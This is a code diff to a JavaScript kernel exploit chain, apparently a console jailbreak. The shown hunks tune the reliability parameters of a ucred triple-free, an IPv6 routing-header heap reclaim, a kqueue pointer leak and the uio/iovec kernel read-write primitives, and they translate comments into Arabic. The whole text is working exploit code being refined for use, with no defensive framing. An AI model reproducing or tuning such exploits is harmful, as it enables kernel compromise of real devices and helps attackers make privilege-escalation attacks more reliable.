@@ -117,7 +117,7 @@ var MSG_IOV_NUM = 0x17;
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
-var MAIN_LOOP_ITERATIONS = 3;
+var MAIN_LOOP_ITERATIONS = 5;
 var TRIPLEFREE_ITERATIONS = 5;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
@@ -1578,7 +1578,7 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking ...');
 
-  // Free triplet[1] for reclaim
+  // نحرر triplets[1] عشان نستخدمه في التسريب
   free_rthdr(ipv6_socks[triplets[1]]);
 
   var kq = new BigInt(0);
@@ -1586,7 +1586,7 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
 
   var count = 0;
-  var MAX_KQ = 3000;   // أسرع + متناغم مع باقي الفازات
+  var MAX_KQ = 3500;   // أبطأ سنة من 3000، بس ثابت أكتر
 
   while (count < MAX_KQ) {
     count++;
@@ -1597,21 +1597,20 @@ function leak_kqueue() {
       return false;
     }
 
-    // Clear old data
+    // تصفير قديم
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    // Small timing balance
+    // توازن إيقاع: ندي الكيرنل نفس ياخده
     sched_yield();
-    nanosleep_fun(1);
+    nanosleep_fun(2); // كانت 1، خليناها 2 علشان ثبات أعلى
 
-    // Leak
+    // محاولة التسريب
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
     var magic = read64(magic_add);
     var fdp   = read64(leak_rthdr.add(0x98));
 
-    // Success condition
     if (magic.eq(magic_val) && !fdp.eq(0)) {
       break;
     }
@@ -1637,7 +1636,7 @@ function leak_kqueue() {
 
   close(kq);
 
-  // Rebuild triplet[1]
+  // إعادة بناء triplets[1]
   triplets[1] = find_triplet(triplets[0], triplets[2]);
 
   return true;
@@ -1695,12 +1694,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 4000;
-var KWRITE_MAX_UIO_RECLAIM = 4000;
+var KREAD_MAX_UIO_RECLAIM  = 6000;
+var KWRITE_MAX_UIO_RECLAIM = 6000;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM  = 4000;
-var KWRITE_MAX_IOV_RECLAIM = 4000;
+var KREAD_MAX_IOV_RECLAIM  = 3000;
+var KWRITE_MAX_IOV_RECLAIM = 3000;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 5;
